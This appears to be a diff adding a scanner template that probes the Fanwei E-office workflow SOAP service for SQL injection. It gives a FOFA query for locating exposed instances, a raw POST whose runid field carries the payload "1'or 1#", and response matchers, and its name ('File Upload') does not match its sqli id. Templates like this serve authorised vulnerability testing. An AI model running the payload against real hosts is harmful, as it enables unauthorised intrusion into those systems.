@@ -1,0 +1,41 @@
+id: fanwei-e-office-workflow-sqli
+
+info:
+  name: Fanwei E-office File Upload
+  author: zp857
+  severity: high
+  reference: https://moresec.yuque.com/iixlqz/wnv3e6/hglxt5
+  tags: fanwei-e-office,sqli
+  metadata:
+    fofa-query: 'body="/general/login/index.php" || body="/general/login/view/css/login.css" || header="/general/login/index.php"'
+
+requests:
+  - raw:
+      - |
+        POST /webservice/workflow/workflow.wsdl.php HTTP/1.1
+        Host: {{Hostname}}
+        SOAPAction: "urn:WorkflowServicewsdl#saveFormData"
+        Accept-Encoding: gzip,deflate
+        Cookie: LOGIN_LANG=cn
+        Content-Type: text/xml
+
+        <SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" xmlns:soap="http://schemas.xmlsoap.org/wsdl/soap/"  xmlns:xsd="http://www.w3.org/1999/XMLSchema"  xmlns:xsi="http://www.w3.org/1999/XMLSchema-instance"  xmlns:m0="http://tempuri.org/"  xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/" xmlns:urn="urn:WorkflowServicewsdl">
+          <SOAP-ENV:Header/>
+          <SOAP-ENV:Body>
+          <saveFormData>
+          <flowid>1</flowid>
+          <runid>1'or 1#</runid>
+          <docid>1</docid>
+          </saveFormData>
+          </SOAP-ENV:Body>
+        </SOAP-ENV:Envelope>
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        words:
+          - "modify"
